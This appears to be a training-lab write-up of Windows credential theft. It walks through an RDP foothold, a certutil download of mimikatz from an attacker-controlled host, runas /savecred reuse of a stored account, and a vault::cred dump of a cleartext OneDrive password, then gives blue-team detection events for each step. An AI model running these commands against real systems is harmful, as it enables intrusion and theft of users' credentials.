# Overview

The lab simulates post-compromise credential access against a Windows workstation (ACADEMY-PWATTCK-CREDDEV01) where a low-privileged user has interactive access. The objective was to recover credentials cached in the Windows Credential Manager by catching a shell as a higher-privileged user through a stored credential, then using mimikatz to dump that user's cleartext passwords. The target OneDrive credential for `mcharles` was recovered as the lab objective.

## MITRE ATT&CK Mapping

- Initial Access
    - [T1078] Valid Accounts
- Lateral Movement
    - [T1021.001] Remote Services: Remote Desktop Protocol
- Command and Control
    - [T1105] Ingress Tool Transfer
- Credential Access
    - [T1555.004] Credentials from Password Stores: Windows Credential Manager
- Execution
    - [T1059.003] Command and Scripting Interpreter: Windows Command Shell
    - [T1059.001] Command and Scripting Interpreter: PowerShell

### Step-by-Step Walkthrough

#### Initial Access - RDP

- Authenticated to the target over RDP using the provided low-privileged credentials for `sadams`.

```bash
xfreerdp /v:10.129.4.3 /u:sadams /p:totally2brow2harmon@
```

```
[WARN][com.freerdp.crypto] - [verify_cb]: Certificate verification failure 'self-signed certificate (18)' at stack position 0
[WARN][com.freerdp.crypto] - [verify_cb]: CN = SRV01
[...]
WARNING: CERTIFICATE NAME MISMATCH!
[...]
The hostname used for this connection (10.129.4.3:3389 [...])
```

- Target host: **10.129.4.3 (ACADEMY-PWATTCK-CREDDEV01)**
- Foothold user: **sadams** / **totally2brow2harmon@**

#### Tool Transfer - mimikatz

- Served `mimikatz.exe` from my attacker host out of the local windows-resources directory.

```bash
cd /usr/share/windows-resources/mimikatz/x64/
python3 -m http.server 8080
```

```
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
10.129.4.3 - - [26/Nov/2026 03:17:38] "GET /mimikatz.exe HTTP/1.1" 200 -
```

- Downloaded the binary to the target using `certutil`.

```powershell
certutil -urlcache -f http://10.10.14.122:8080/mimikatz.exe mimikatz.exe
```

```
****  Online  ****
CertUtil: -URLCache command completed successfully.
```

- Attacker host: **10.10.14.122**
- Transfer confirmed by two `GET /mimikatz.exe HTTP/1.1 200` entries in the HTTP server log.

#### Stored Credential Reuse - runas /savecred

- Enumerated saved credentials in Credential Manager and found a stored password for a higher-privileged account.

```cmd
cmdkey /list
```

```
Currently stored credentials:

    Target: Domain:interactive=SRV01\mcharles
    Type: Domain Password
    User: SRV01\mcharles
```

- Spawned a shell using the saved `SRV01\mcharles` credential without supplying a password.

```cmd
runas /savecred /user:SRV01\mcharles cmd.exe
```

```
Attempting to start cmd.exe as user "SRV01\mcharles" ...
```

- Confirmed my execution context in the new shell.

```cmd
whoami
```

```
srv01\mcharles
```

- Saved credential target: **Domain:interactive=SRV01\mcharles**
- Resulting context: **srv01\mcharles** (code execution as a second user via `/savecred` with no password prompt)

#### Credential Access - Windows Credential Manager

- From the `mcharles` shell, executed mimikatz and dumped the Windows Vault / Credential Manager entries. Running in the `mcharles` context exposed that user's cached credentials.

```powershell
.\mimikatz.exe
```

```
mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
```

```
mimikatz # vault::cred
```

```
TargetName : onedrive.live.com / <NULL>
UserName   : mcharles@inlanefreight.local
Comment    : <NULL>
Type       : 1 - generic
Persist    : 3 - enterprise
Flags      : 00000000
Credential : Inlanefreight#2025
Attributes : 0

TargetName : WindowsLive:target=virtualapp/didlogical / <NULL>
UserName   : 02jejfxhvabjneqt
Comment    : PersistedCredential
[...]

TargetName : LegacyGeneric:target=onedrive.live.com / <NULL>
UserName   : mcharles@inlanefreight.local
[...]
Credential : Inlanefreight#2025
Attributes : 0
```

- Recovered the cleartext credential for the lab objective.
- OneDrive user: **mcharles@inlanefreight.local**
- OneDrive password: **Inlanefreight#2025**

#### Objective

- Recovered the OneDrive password for `mcharles` from the Windows Credential Manager.
- Answer: **Inlanefreight#2025**

#### Investigation (Blue Team)

**1. RDP Authentication**
**Attack Step:** I logged into the workstation over RDP with valid low-privileged credentials.

**Detection:**
- Security log: Event ID 4624 (Logon Type 10, RemoteInteractive) for user `sadams`.
- Security log: Event ID 4625 for any failed attempts preceding success.
- TerminalServices-RemoteConnectionManager and TerminalServices-LocalSessionManager operational logs: Event IDs 1149, 21, 22, 25 for the session source IP.

**Investigation:**
- Correlate the 4624 Logon Type 10 source network address against expected administrative or user subnets; flag external or unexpected hosts.
- Identify the workstation involved and confirm whether `sadams` normally performs RemoteInteractive logons.
- Build a session timeline from LocalSessionManager session connect/reconnect/disconnect events.

**2. Ingress Tool Transfer via certutil**
**Attack Step:** I downloaded mimikatz using `certutil` from my HTTP server.

**Detection:**
- Sysmon: Event ID 1 (process creation) for `certutil.exe` with a URL argument and an output file.
- Sysmon: Event ID 3 (network connection) from `certutil.exe` to an external IP on port 8080.
- Sysmon: Event ID 11 (file create) for `mimikatz.exe` written to the user profile directory.
- Security log: Event ID 4688 process creation for `certutil.exe` if command-line auditing is enabled.

**Investigation:**
- Flag `certutil` use with `-urlcache`/`-f` and a remote URL as a living-off-the-land download indicator.
- Pivot on the destination IP and port to find other hosts that contacted the same server.
- Review the download directory for the dropped binary and preserve it for analysis.

**3. Stored Credential Reuse (cmdkey / runas /savecred)**
**Attack Step:** I listed saved credentials with `cmdkey` and used `runas /savecred` to execute `cmd.exe` as `SRV01\mcharles` without a password.

**Detection:**
- Sysmon: Event ID 1 / Security Event ID 4688 for `cmdkey.exe /list` and for `runas.exe` with `/savecred`.
- Security log: Event ID 4624 Logon Type 9 (NewCredentials) for `SRV01\mcharles` originating from the `sadams` session, with a seclogo/`runas` logon process. No interactive logon occurs.
- Security log: Event ID 4648 (logon attempt using explicit credentials) linking `sadams` to the `mcharles` target.

**Investigation:**
- Flag 4648 events where one user invokes explicit credentials for a different account on the same host.
- Flag Logon Type 9 events, which indicate credentials being used only for outbound/other-identity access while the local session identity stays the same.
- Confirm whether `SRV01\mcharles` credentials were legitimately saved on this workstation and, if not, revoke and rotate them.
- Trace the child processes spawned under the `mcharles` context (the `runas` cmd.exe and any PowerShell launched with `-ep bypass`) to assess downstream activity.

**4. Credential Access from Credential Manager (mimikatz)**
**Attack Step:** From the `mcharles` shell I ran mimikatz `vault::cred` to dump cleartext credentials stored in that user's Windows Vault.

**Detection:**
- Sysmon: Event ID 1 and Security Event ID 4688 for `mimikatz.exe` execution; the on-disk name may differ, so match on image hash and signature anomalies.
- Sysmon: Event ID 10 (process access) targeting `lsass.exe` with suspicious access masks from a non-system process.
- Security log: Event ID 5379 (Credential Manager credentials were read).

**Investigation:**
- Review 5379 read events and identify the process and user that enumerated stored credentials.
- Treat every credential cached in the affected Vault as compromised and scope which accounts and services they unlock (here, the OneDrive credential for `mcharles`).
- Hunt for the mimikatz banner strings and module names in any captured process memory or EDR telemetry.
